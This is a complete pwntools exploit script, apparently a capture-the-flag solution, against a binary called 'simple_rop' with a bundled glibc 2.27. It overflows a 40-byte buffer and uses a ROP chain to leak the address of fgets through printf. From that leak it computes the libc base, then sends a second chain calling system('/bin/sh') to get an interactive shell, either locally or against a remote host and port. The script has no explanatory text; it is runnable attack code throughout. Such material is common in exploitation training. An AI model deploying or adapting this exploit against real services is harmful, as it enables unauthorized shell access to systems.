from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

exe = './simple_rop'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context(terminal=['tmux', 'split-window', '-h'])
rop = ROP(exe)
libc = ELF("./libc6_2.27-3ubuntu1.5_amd64.so", checksec=False)

io = start()

poprdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = poprdi + 1
payload = flat (
    b'A' * 40,
    poprdi,
    elf.got.fgets,
    ret,
    elf.plt.printf,
    ret,
    elf.sym.main
    )

io.sendlineafter(b'> ', payload)
leak = u64(io.recvuntil(b'Sim')[:-3].ljust(8, b'\x00'))

libc.address = leak - libc.sym.fgets
log.success("Leak %#x", leak)
log.success("Libc base %#x", libc.address)

payload = flat (
    b'A' * 40,
    poprdi,
    next(libc.search(b'/bin/sh\x00')),
    ret,
    libc.sym.system
    )

io.sendlineafter(b'> ', payload)
io.interactive()
